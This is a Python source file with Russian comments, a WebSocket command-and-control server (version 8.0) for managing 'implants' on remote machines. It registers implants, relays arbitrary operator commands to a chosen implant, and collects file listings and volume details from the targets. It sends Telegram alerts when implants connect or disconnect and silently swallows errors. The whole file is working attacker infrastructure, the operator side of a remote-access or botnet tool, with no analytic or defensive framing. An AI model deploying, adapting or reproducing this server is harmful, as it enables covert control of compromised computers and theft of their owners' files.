# --- Файл: c2_server.py (Версия 8.0 - НОВАЯ АРХИТЕКТУРА) ---
import asyncio
import json
import os
from aiohttp import web
from utils import send_telegram_message

# Глобальные переменные для хранения подключенных клиентов
IMPLANTS, OPERATOR = {}, None

async def safe_send(ws, data):
    """Безопасно отправляет JSON-сообщение, игнорируя ошибки отключения."""
    if ws and not ws.closed:
        try:
            await ws.send_json(data)
            return True
        except (ConnectionResetError, asyncio.CancelledError):
            return False
    return False

async def broadcast_bot_list():
    """Отправляет обновленный список ботов оператору."""
    await safe_send(OPERATOR, {'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def websocket_handler(request):
    """Основной обработчик WebSocket-соединений."""
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    client_type, client_id = None, None
    try:
        # Ждем первое сообщение для идентификации
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            await broadcast_bot_list()

        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            if not client_id: raise ValueError("Имплант не предоставил ID")

            # В новой архитектуре просто регистрируем бота, не получая файлы сразу
            IMPLANTS[client_id] = {"ws": ws, "files": None, "volume": None}
            hostname = client_id.replace("implant_", "")
            print(f"[+] Имплант ОНЛАЙН: {hostname}")
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {hostname}")
            await broadcast_bot_list()

        # Основной цикл обработки сообщений
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT and msg.data != 'pong':
                data = json.loads(msg.data)

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if target_id in IMPLANTS:
                        # Просто пересылаем любую команду от оператора целевому импланту
                        await safe_send(IMPLANTS[target_id]["ws"], data)

                elif client_type == 'implant':
                    # Слушаем сообщения от импланта
                    if data.get('type') == 'bot_details':
                        # Если имплант прислал детали, сохраняем их и пересылаем оператору
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get("files")
                            IMPLANTS[client_id]["volume"] = data.get("volume")
                            await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': client_id, 'data': data})

                    elif data.get('type') == 'status':
                        # Пересылаем любые другие статусы от импланта оператору
                        await safe_send(OPERATOR, data)

    except Exception:
        # Подавляем ошибки, чтобы сервер не падал от некорректных отключений
        pass
    finally:
        # Корректно обрабатываем отключение
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            hostname = client_id.replace("implant_", "")
            print(f"[-] Имплант ОТКЛЮЧИЛСЯ: {hostname}")
            send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {hostname}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None

    return ws

async def http_handler(request):
    """Отдает главную HTML-страницу."""
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    """Основная функция для запуска сервера."""
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V8.0 FINAL ARCHITECTURE) ONLINE ======")
    send_telegram_message("🚀 Сервер запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nСервер остановлен.")
    finally:
        send_telegram_message("🛑 Сервер остановлен.")
